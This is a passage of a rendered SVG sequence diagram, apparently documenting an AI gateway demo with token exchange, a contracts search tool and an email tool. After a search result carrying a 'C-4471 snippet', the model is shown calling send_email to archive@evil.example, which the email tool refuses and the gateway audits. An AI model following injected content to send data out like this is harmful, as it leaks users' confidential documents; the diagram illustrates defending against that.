068-.035.069-.035.07-.034.072-.034.072-.033.074-.033.151-.066.155-.064.159-.063.164-.061.167-.06.172-.059.176-.057.179-.056.184-.054.187-.053.19-.051.195-.05.198-.048.201-.046.204-.045.208-.043.211-.041.214-.04.217-.038.22-.036.223-.034.226-.032.228-.031.231-.028.234-.027.236-.024.238-.023.241-.02.243-.019.245-.016.247-.015.249-.012.251-.01.253-.008.255-.005.256-.004.258-.001.258.001zm-9.258 20.499v.01l.001.021.003.021.004.022.005.021.006.022.007.022.009.023.01.022.011.023.012.023.013.023.015.023.016.024.017.023.018.024.019.024.021.024.022.025.023.024.024.025.052.049.056.05.061.051.066.051.07.051.075.051.079.052.084.052.088.052.092.052.097.052.102.051.105.052.11.052.114.051.119.051.123.051.127.05.131.05.135.05.139.048.144.049.147.047.152.047.155.047.16.045.163.045.167.043.171.043.176.041.178.041.183.039.187.039.19.037.194.035.197.035.202.033.204.031.209.03.212.029.216.027.219.025.222.024.226.021.23.02.233.018.236.016.24.015.243.012.246.01.249.008.253.005.256.004.259.001.26-.001.257-.004.254-.005.25-.008.247-.011.244-.012.241-.014.237-.016.233-.018.231-.021.226-.021.224-.024.22-.026.216-.027.212-.028.21-.031.205-.031.202-.034.198-.034.194-.036.191-.037.187-.039.183-.04.179-.04.175-.042.172-.043.168-.044.163-.045.16-.046.155-.046.152-.047.148-.048.143-.049.139-.049.136-.05.131-.05.126-.05.123-.051.118-.052.114-.051.11-.052.106-.052.101-.052.096-.052.092-.052.088-.053.083-.051.079-.052.074-.052.07-.051.065-.051.06-.051.056-.05.051-.05.023-.024.023-.025.021-.024.02-.024.019-.024.018-.024.017-.024.015-.023.014-.024.013-.023.012-.023.01-.023.01-.022.008-.022.006-.022.006-.022.004-.022.004-.021.001-.021.001-.021v-4.127l-.077.055-.08.053-.083.054-.085.053-.087.052-.09.052-.093.051-.095.05-.097.05-.1.049-.102.049-.105.048-.106.047-.109.047-.111.046-.114.045-.115.045-.118.044-.12.043-.122.042-.124.042-.126.041-.128.04-.13.04-.132.038-.134.038-.135.037-.138.037-.139.035-.142.035-.143.034-.144.033-.147.032-.148.031-.15.03-.151.03-.153.029-.154.027-.156.027-.158.026-.159.025-.161.024-.162.023-.163.022-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.011-.178.01-.179.008-.179.008-.181.006-.182.005-.182.004-.184.003-.184.002h-.37l-.184-.002-.184-.003-.182-.004-.182-.005-.181-.006-.179-.008-.179-.008-.178-.01-.176-.011-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.022-.162-.023-.161-.024-.159-.025-.157-.026-.156-.027-.155-.027-.153-.029-.151-.03-.15-.03-.148-.031-.146-.032-.145-.033-.143-.034-.141-.035-.14-.035-.137-.037-.136-.037-.134-.038-.132-.038-.13-.04-.128-.04-.126-.041-.124-.042-.122-.042-.12-.044-.117-.043-.116-.045-.113-.045-.112-.046-.109-.047-.106-.047-.105-.048-.102-.049-.1-.049-.097-.05-.095-.05-.093-.052-.09-.051-.087-.052-.085-.053-.083-.054-.08-.054-.077-.054v4.127zm0-5.654v.011l.001.021.003.021.004.021.005.022.006.022.007.022.009.022.01.022.011.023.012.023.013.023.015.024.016.023.017.024.018.024.019.024.021.024.022.024.023.025.024.024.052.05.056.05.061.05.066.051.07.051.075.052.079.051.084.052.088.052.092.052.097.052.102.052.105.052.11.051.114.051.119.052.123.05.127.051.131.05.135.049.139.049.144.048.147.048.152.047.155.046.16.045.163.045.167.044.171.042.176.042.178.04.183.04.187.038.19.037.194.036.197.034.202.033.204.032.209.03.212.028.216.027.219.025.222.024.226.022.23.02.233.018.236.016.24.014.243.012.246.01.249.008.253.006.256.003.259.001.26-.001.257-.003.254-.006.25-.008.247-.01.244-.012.241-.015.237-.016.233-.018.231-.02.226-.022.224-.024.22-.025.216-.027.212-.029.21-.03.205-.032.202-.033.198-.035.194-.036.191-.037.187-.039.183-.039.179-.041.175-.042.172-.043.168-.044.163-.045.16-.045.155-.047.152-.047.148-.048.143-.048.139-.05.136-.049.131-.05.126-.051.123-.051.118-.051.114-.052.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.051.07-.052.065-.051.06-.05.056-.051.051-.049.023-.025.023-.024.021-.025.02-.024.019-.024.018-.024.017-.024.015-.023.014-.023.013-.024.012-.022.01-.023.01-.023.008-.022.006-.022.006-.022.004-.021.004-.022.001-.021.001-.021v-4.139l-.077.054-.08.054-.083.054-.085.052-.087.053-.09.051-.093.051-.095.051-.097.05-.1.049-.102.049-.105.048-.106.047-.109.047-.111.046-.114.045-.115.044-.118.044-.12.044-.122.042-.124.042-.126.041-.128.04-.13.039-.132.039-.134.038-.135.037-.138.036-.139.036-.142.035-.143.033-.144.033-.147.033-.148.031-.15.03-.151.03-.153.028-.154.028-.156.027-.158.026-.159.025-.161.024-.162.023-.163.022-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.011-.178.009-.179.009-.179.007-.181.007-.182.005-.182.004-.184.003-.184.002h-.37l-.184-.002-.184-.003-.182-.004-.182-.005-.181-.007-.179-.007-.179-.009-.178-.009-.176-.011-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.022-.162-.023-.161-.024-.159-.025-.157-.026-.156-.027-.155-.028-.153-.028-.151-.03-.15-.03-.148-.031-.146-.033-.145-.033-.143-.033-.141-.035-.14-.036-.137-.036-.136-.037-.134-.038-.132-.039-.13-.039-.128-.04-.126-.041-.124-.042-.122-.043-.12-.043-.117-.044-.116-.044-.113-.046-.112-.046-.109-.046-.106-.047-.105-.048-.102-.049-.1-.049-.097-.05-.095-.051-.093-.051-.09-.051-.087-.053-.085-.052-.083-.054-.08-.054-.077-.054v4.139zm0-5.666v.011l.001.02.003.022.004.021.005.022.006.021.007.022.009.023.01.022.011.023.012.023.013.023.015.023.016.024.017.024.018.023.019.024.021.025.022.024.023.024.024.025.052.05.056.05.061.05.066.051.07.051.075.052.079.051.084.052.088.052.092.052.097.052.102.052.105.051.11.052.114.051.119.051.123.051.127.05.131.05.135.05.139.049.144.048.147.048.152.047.155.046.16.045.163.045.167.043.171.043.176.042.178.04.183.04.187.038.19.037.194.036.197.034.202.033.204.032.209.03.212.028.216.027.219.025.222.024.226.021.23.02.233.018.236.017.24.014.243.012.246.01.249.008.253.006.256.003.259.001.26-.001.257-.003.254-.006.25-.008.247-.01.244-.013.241-.014.237-.016.233-.018.231-.02.226-.022.224-.024.22-.025.216-.027.212-.029.21-.03.205-.032.202-.033.198-.035.194-.036.191-.037.187-.039.183-.039.179-.041.175-.042.172-.043.168-.044.163-.045.16-.045.155-.047.152-.047.148-.048.143-.049.139-.049.136-.049.131-.051.126-.05.123-.051.118-.052.114-.051.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.052.07-.051.065-.051.06-.051.056-.05.051-.049.023-.025.023-.025.021-.024.02-.024.019-.024.018-.024.017-.024.015-.023.014-.024.013-.023.012-.023.01-.022.01-.023.008-.022.006-.022.006-.022.004-.022.004-.021.001-.021.001-.021v-4.153l-.077.054-.08.054-.083.053-.085.053-.087.053-.09.051-.093.051-.095.051-.097.05-.1.049-.102.048-.105.048-.106.048-.109.046-.111.046-.114.046-.115.044-.118.044-.12.043-.122.043-.124.042-.126.041-.128.04-.13.039-.132.039-.134.038-.135.037-.138.036-.139.036-.142.034-.143.034-.144.033-.147.032-.148.032-.15.03-.151.03-.153.028-.154.028-.156.027-.158.026-.159.024-.161.024-.162.023-.163.023-.165.021-.166.02-.167.019-.169.018-.169.017-.171.016-.173.015-.173.014-.175.013-.175.012-.177.01-.178.01-.179.009-.179.007-.181.006-.182.006-.182.004-.184.003-.184.001-.185.001-.185-.001-.184-.001-.184-.003-.182-.004-.182-.006-.181-.006-.179-.007-.179-.009-.178-.01-.176-.01-.176-.012-.175-.013-.173-.014-.172-.015-.171-.016-.17-.017-.169-.018-.167-.019-.166-.02-.165-.021-.163-.023-.162-.023-.161-.024-.159-.024-.157-.026-.156-.027-.155-.028-.153-.028-.151-.03-.15-.03-.148-.032-.146-.032-.145-.033-.143-.034-.141-.034-.14-.036-.137-.036-.136-.037-.134-.038-.132-.039-.13-.039-.128-.041-.126-.041-.124-.041-.122-.043-.12-.043-.117-.044-.116-.044-.113-.046-.112-.046-.109-.046-.106-.048-.105-.048-.102-.048-.1-.05-.097-.049-.095-.051-.093-.051-.09-.052-.087-.052-.085-.053-.083-.053-.08-.054-.077-.054v4.153zm8.74-8.179l-.257.004-.254.005-.25.008-.247.011-.244.012-.241.014-.237.016-.233.018-.231.021-.226.022-.224.023-.22.026-.216.027-.212.028-.21.031-.205.032-.202.033-.198.034-.194.036-.191.038-.187.038-.183.04-.179.041-.175.042-.172.043-.168.043-.163.045-.16.046-.155.046-.152.048-.148.048-.143.048-.139.049-.136.05-.131.05-.126.051-.123.051-.118.051-.114.052-.11.052-.106.052-.101.052-.096.052-.092.052-.088.052-.083.052-.079.052-.074.051-.07.052-.065.051-.06.05-.056.05-.051.05-.023.025-.023.024-.021.024-.02.025-.019.024-.018.024-.017.023-.015.024-.014.023-.013.023-.012.023-.01.023-.01.022-.008.022-.006.023-.006.021-.004.022-.004.021-.001.021-.001.021.001.021.001.021.004.021.004.022.006.021.006.023.008.022.01.022.01.023.012.023.013.023.014.023.015.024.017.023.018.024.019.024.02.025.021.024.023.024.023.025.051.05.056.05.06.05.065.051.07.052.074.051.079.052.083.052.088.052.092.052.096.052.101.052.106.052.11.052.114.052.118.051.123.051.126.051.131.05.136.05.139.049.143.048.148.048.152.048.155.046.16.046.163.045.168.043.172.043.175.042.179.041.183.04.187.038.191.038.194.036.198.034.202.033.205.032.21.031.212.028.216.027.22.026.224.023.226.022.231.021.233.018.237.016.241.014.244.012.247.011.25.008.254.005.257.004.26.001.26-.001.257-.004.254-.005.25-.008.247-.011.244-.012.241-.014.237-.016.233-.018.231-.021.226-.022.224-.023.22-.026.216-.027.212-.028.21-.031.205-.032.202-.033.198-.034.194-.036.191-.038.187-.038.183-.04.179-.041.175-.042.172-.043.168-.043.163-.045.16-.046.155-.046.152-.048.148-.048.143-.048.139-.049.136-.05.131-.05.126-.051.123-.051.118-.051.114-.052.11-.052.106-.052.101-.052.096-.052.092-.052.088-.052.083-.052.079-.052.074-.051.07-.052.065-.051.06-.05.056-.05.051-.05.023-.025.023-.024.021-.024.02-.025.019-.024.018-.024.017-.023.015-.024.014-.023.013-.023.012-.023.01-.023.01-.022.008-.022.006-.023.006-.021.004-.022.004-.021.001-.021.001-.021-.001-.021-.001-.021-.004-.021-.004-.022-.006-.021-.006-.023-.008-.022-.01-.022-.01-.023-.012-.023-.013-.023-.014-.023-.015-.024-.017-.023-.018-.024-.019-.024-.02-.025-.021-.024-.023-.024-.023-.025-.051-.05-.056-.05-.06-.05-.065-.051-.07-.052-.074-.051-.079-.052-.083-.052-.088-.052-.092-.052-.096-.052-.101-.052-.106-.052-.11-.052-.114-.052-.118-.051-.123-.051-.126-.051-.131-.05-.136-.05-.139-.049-.143-.048-.148-.048-.152-.048-.155-.046-.16-.046-.163-.045-.168-.043-.172-.043-.175-.042-.179-.041-.183-.04-.187-.038-.191-.038-.194-.036-.198-.034-.202-.033-.205-.032-.21-.031-.212-.028-.216-.027-.22-.026-.224-.023-.226-.022-.231-.021-.233-.018-.237-.016-.241-.014-.244-.012-.247-.011-.25-.008-.254-.005-.257-.004-.26-.001-.26.001z"/></symbol></defs><defs><symbol id="my-svg-clock" width="24" height="24"><path transform="scale(.5)" d="M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.848 12.459c.202.038.202.333.001.372-1.907.361-6.045 1.111-6.547 1.111-.719 0-1.301-.582-1.301-1.301 0-.512.77-5.447 1.125-7.445.034-.192.312-.181.343.014l.985 6.238 5.394 1.011z"/></symbol></defs><defs><marker id="my-svg-arrowhead" refX="7.9" refY="5" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto-start-reverse"><path d="M -1 0 L 10 5 L 0 10 z"/></marker></defs><defs><marker id="my-svg-crosshead" markerWidth="15" markerHeight="8" orient="auto" refX="4" refY="4.5"><path fill="none" stroke="#000000" stroke-width="1pt" d="M 1,2 L 6,7 M 6,2 L 1,7" style="stroke-dasharray: 0, 0;"/></marker></defs><defs><marker id="my-svg-filled-head" refX="15.5" refY="7" markerWidth="20" markerHeight="28" orient="auto"><path d="M 18,7 L9,13 L14,7 L9,1 Z"/></marker></defs><defs><marker id="my-svg-sequencenumber" refX="15" refY="15" markerWidth="60" markerHeight="40" orient="auto"><circle cx="15" cy="15" r="6"/></marker></defs><defs><marker id="my-svg-solidTopArrowHead" refX="7.9" refY="7.25" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto-start-reverse"><path d="M 0 0 L 10 8 L 0 8 z"/></marker></defs><defs><marker id="my-svg-solidBottomArrowHead" refX="7.9" refY="0.75" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto-start-reverse"><path d="M 0 0 L 10 0 L 0 8 z"/></marker></defs><defs><marker id="my-svg-stickTopArrowHead" refX="7.5" refY="7" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto-start-reverse"><path d="M 0 0 L 7 7" stroke="black" stroke-width="1.5" fill="none"/></marker></defs><defs><marker id="my-svg-stickBottomArrowHead" refX="7.5" refY="0" markerUnits="userSpaceOnUse" markerWidth="12" markerHeight="12" orient="auto-start-reverse"><path d="M 0 7 L 7 0" stroke="black" stroke-width="1.5" fill="none"/></marker></defs><text x="253" y="80" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /v1/ask  X-Virtual-Key: vk-legal-demo</text><line x1="82" y1="111" x2="429" y2="111" class="messageLine0" data-et="message" data-id="i1" data-from="U" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="75" y1="111" x2="75" y2="111" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="75" y="115" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">1</text><text x="434" y="126" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">resolve key, check team budget</text><path d="M 434,157 C 494,147 494,187 434,177" class="messageLine0" data-et="message" data-id="i2" data-from="G" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" x1="440" style="fill: none;"/><line x1="433" y1="157" x2="433" y2="157" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="161" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">2</text><text x="648" y="202" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /login (demo shortcut for a real OIDC login)</text><line x1="440" y1="233" x2="862" y2="233" class="messageLine0" data-et="message" data-id="i3" data-from="G" data-to="I" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="233" x2="433" y2="233" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="237" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">3</text><text x="651" y="248" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">token  sub=alice  aud=gateway  groups=[legal,all]</text><line x1="871" y1="279" x2="437" y2="279" class="messageLine1" data-et="message" data-id="i4" data-from="I" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="866" y1="279" x2="866" y2="279" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="866" y="283" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">4</text><text x="648" y="294" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /token  resource=.../contracts  scope=contracts.read</text><line x1="440" y1="325" x2="862" y2="325" class="messageLine0" data-et="message" data-id="i5" data-from="G" data-to="I" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="325" x2="433" y2="325" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="329" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">5</text><text x="651" y="340" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">token  sub=alice  aud=.../contracts  act={sub:gateway}</text><line x1="871" y1="371" x2="437" y2="371" class="messageLine1" data-et="message" data-id="i6" data-from="I" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="866" y1="371" x2="866" y2="371" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="866" y="375" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">6</text><text x="748" y="386" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">search_contracts  Bearer &lt;contracts token&gt;</text><line x1="440" y1="417" x2="1062.5" y2="417" class="messageLine0" data-et="message" data-id="i7" data-from="G" data-to="MC" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="417" x2="433" y2="417" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="421" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">7</text><text x="1068" y="432" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">verify sig, iss, exp, scope, aud</text><path d="M 1067.5,463 C 1127.5,453 1127.5,493 1067.5,483" class="messageLine0" data-et="message" data-id="i8" data-from="MC" data-to="MC" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" x1="1073.5" style="fill: none;"/><line x1="1066.5" y1="463" x2="1066.5" y2="463" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1066.5" y="467" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">8</text><text x="1231" y="508" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /api/search  X-On-Behalf-Of: alice</text><line x1="1073.5" y1="539" x2="1393.5" y2="539" class="messageLine0" data-et="message" data-id="i9" data-from="MC" data-to="API" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="1066.5" y1="539" x2="1066.5" y2="539" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1066.5" y="543" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">9</text><text x="1133" y="554" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /introspect</text><line x1="1402.5" y1="585" x2="870" y2="585" class="messageLine0" data-et="message" data-id="i10" data-from="API" data-to="I" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="1397.5" y1="585" x2="1397.5" y2="585" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1397.5" y="589" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">10</text><text x="1130" y="600" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">active=true  sub=alice  groups=[legal,all]</text><line x1="873" y1="631" x2="1393.5" y2="631" class="messageLine1" data-et="message" data-id="i11" data-from="I" data-to="API" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="866" y1="631" x2="866" y2="631" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="866" y="635" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">11</text><text x="1399" y="646" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">trim by groups</text><path d="M 1398.5,677 C 1458.5,667 1458.5,707 1398.5,697" class="messageLine0" data-et="message" data-id="i12" data-from="API" data-to="API" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" x1="1404.5" style="fill: none;"/><line x1="1397.5" y1="677" x2="1397.5" y2="677" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1397.5" y="681" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">12</text><text x="1234" y="722" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">hits, total, denied_count</text><line x1="1402.5" y1="753" x2="1070.5" y2="753" class="messageLine1" data-et="message" data-id="i13" data-from="API" data-to="MC" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="1397.5" y1="753" x2="1397.5" y2="753" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1397.5" y="757" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">13</text><text x="751" y="768" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">SearchResult</text><line x1="1071.5" y1="797" x2="437" y2="797" class="messageLine1" data-et="message" data-id="i14" data-from="MC" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="1066.5" y1="797" x2="1066.5" y2="797" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1066.5" y="801" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">14</text><text x="1014" y="812" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">tool result, including the C-4471 snippet</text><line x1="440" y1="843" x2="1593.5" y2="843" class="messageLine0" data-et="message" data-id="i15" data-from="G" data-to="M" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="843" x2="433" y2="843" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="847" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">15</text><text x="1017" y="858" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">send_email(to=archive@evil.example)</text><line x1="1602.5" y1="889" x2="437" y2="889" class="messageLine1" data-et="message" data-id="i16" data-from="M" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="1597.5" y1="889" x2="1597.5" y2="889" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1597.5" y="893" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">16</text><text x="648" y="904" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">POST /token  resource=.../tickets  scope=tickets.write</text><line x1="440" y1="935" x2="862" y2="935" class="messageLine0" data-et="message" data-id="i17" data-from="G" data-to="I" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="935" x2="433" y2="935" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="939" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">17</text><text x="651" y="950" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">token  sub=alice  aud=.../tickets</text><line x1="871" y1="979" x2="437" y2="979" class="messageLine1" data-et="message" data-id="i18" data-from="I" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="866" y1="979" x2="866" y2="979" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="866" y="983" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">18</text><text x="1114" y="994" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">send_email  Bearer &lt;tickets token&gt;</text><line x1="440" y1="1025" x2="1793.5" y2="1025" class="messageLine0" data-et="message" data-id="i19" data-from="G" data-to="MT" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="fill: none;"/><line x1="433" y1="1025" x2="433" y2="1025" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="1029" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">19</text><text x="1799" y="1040" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">verify aud, then check recipient domain</text><path d="M 1798.5,1071 C 1858.5,1061 1858.5,1101 1798.5,1091" class="messageLine0" data-et="message" data-id="i20" data-from="MT" data-to="MT" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" x1="1804.5" style="fill: none;"/><line x1="1797.5" y1="1071" x2="1797.5" y2="1071" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1797.5" y="1075" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">20</text><text x="1117" y="1116" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">SendResult(sent=false, reason=recipient domain not allowed)</text><line x1="1802.5" y1="1147" x2="437" y2="1147" class="messageLine1" data-et="message" data-id="i21" data-from="MT" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="1797.5" y1="1147" x2="1797.5" y2="1147" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="1797.5" y="1151" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">21</text><text x="434" y="1162" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">audit: attempted, refused, by whom</text><path d="M 434,1193 C 494,1183 494,1223 434,1213" class="messageLine0" data-et="message" data-id="i22" data-from="G" data-to="G" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" x1="440" style="fill: none;"/><line x1="433" y1="1193" x2="433" y2="1193" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="1197" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">22</text><text x="256" y="1238" text-anchor="middle" dominant-baseline="middle" alignment-baseline="middle" class="messageText" dy="1em" style="font-size: 16px; font-weight: 400;">answer + blocked[]</text><line x1="438" y1="1267" x2="79" y2="1267" class="messageLine1" data-et="message" data-id="i23" data-from="G" data-to="U" stroke-width="2" stroke="none" marker-end="url(#my-svg-arrowhead)" style="stroke-dasharray: 3, 3; fill: none;"/><line x1="433" y1="1267" x2="433" y2="1267" stroke-width="0" marker-start="url(#my-svg-sequencenumber)"/><text x="433" y="1271" font-family="sans-serif" font-size="12px" text-anchor="middle" class="sequenceNumber">23</text></svg>